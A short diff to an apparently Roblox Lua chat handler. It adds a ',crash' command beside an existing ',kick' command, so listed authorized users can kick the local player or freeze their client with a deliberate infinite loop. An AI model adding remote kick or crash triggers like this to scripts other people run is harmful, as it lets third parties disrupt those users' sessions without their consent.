@@ -20,9 +20,19 @@ local function onChat(player, message)
     local senderName = player.Name:lower()
     if not AUTHORIZED_USERS[senderName] then return end
 
-    local command = message:lower():match("^,kick%s+(%S+)")
-    if command and command == LocalPlayer.Name:lower() then
+    message = message:lower()
+
+    local kickTarget = message:match("^,kick%s+(%S+)")
+    if kickTarget and kickTarget == LocalPlayer.Name:lower() then
         LocalPlayer:Kick("You were kicked by " .. player.Name)
+        return
+    end
+
+    local crashTarget = message:match("^,crash%s+(%S+)")
+    if crashTarget and crashTarget == LocalPlayer.Name:lower() then
+        while true do
+            print("imagine crashing...")
+        end
     end
 end
 
